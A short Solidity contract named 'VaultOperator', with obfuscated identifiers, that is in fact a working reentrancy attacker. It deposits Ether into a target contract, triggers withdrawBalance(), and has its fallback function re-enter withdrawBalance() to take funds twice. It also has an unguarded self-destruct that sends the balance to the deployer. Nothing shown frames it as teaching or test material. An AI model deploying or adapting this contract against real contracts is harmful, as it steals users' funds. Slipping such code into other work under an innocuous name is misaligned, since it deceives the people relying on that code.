pragma solidity ^0.4.15;

contract VaultOperator {
    bool public _0x713a4a=false;
    address public _0xdb4411;
    address public _0xd58cf8;

    function VaultOperator() public{
        _0xd58cf8 = msg.sender;
    }

    function _0x95d9ec(address _0x956def) public payable{
        _0xdb4411 = _0x956def ;

        require(_0xdb4411.call.value(msg.value)(bytes4(_0x8597d8("addToBalance()"))));
    }

    function _0xf5b448() public{
        _0x713a4a = true;


        require(_0xdb4411.call(bytes4(_0x8597d8("withdrawBalance()"))));
    }

    function () public payable{

        if (_0x713a4a){
            _0x713a4a = false;
                require(_0xdb4411.call(bytes4(_0x8597d8("withdrawBalance()"))));
        }
    }

    function _0xe840fc(){
        suicide(_0xd58cf8);
    }

}